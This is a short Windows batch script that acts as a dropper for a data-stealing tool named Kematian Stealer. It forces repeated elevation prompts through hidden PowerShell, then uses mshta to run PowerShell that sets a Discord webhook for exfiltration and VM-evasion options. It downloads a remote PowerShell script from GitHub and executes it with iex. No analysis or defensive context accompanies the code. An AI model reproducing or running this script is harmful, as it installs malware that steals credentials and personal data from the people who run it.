@echo off
cd /d "%~dp0"
net session >nul 2>&1
if not %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$webhook = 'https://discord.com/api/webhooks/1252162789292642305/C87RzwPxEbnnQEYeQlAyEh4rHKq1BNNfyV3eenDfswGnswxrOMSLoyz8ukFKOuKLmonS';$debug = $false;$vm_protect = $true;$encryption_key = 'gbm))China1';$blockhostsfile = $false;$criticalprocess = $false;$melt = $false;$fakeerror = $false;$persistence = $false;$write_disk_only = $false;$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer-V3/main/frontend-src/main.ps1' -USeB | iex",0))
